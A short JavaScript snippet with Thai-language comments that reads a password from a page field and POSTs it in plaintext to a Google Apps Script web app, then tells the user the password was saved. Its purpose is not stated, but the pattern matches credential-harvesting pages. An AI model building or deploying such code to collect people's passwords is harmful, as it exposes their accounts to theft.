function sendPassword() {
    var password = document.getElementById("passwordInput").value;
    
    fetch("https://script.google.com/macros/s/AKfycbzTr5e-vugJIz9AGhKgur81CUujxkPJGYWUeTK2mVFyqLfHWCobGHVEKOECoe9HZNr1/exec", { // เปลี่ยนเป็น Web App URL ของคุณ
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password: password })
    })
    .then(response => response.text())
    .then(data => {
        alert("บันทึกรหัสแล้ว!");
    })
    .catch(error => {
        console.error("เกิดข้อผิดพลาด:", error);
        alert("เกิดข้อผิดพลาด โปรดลองอีกครั้ง");
    });
}

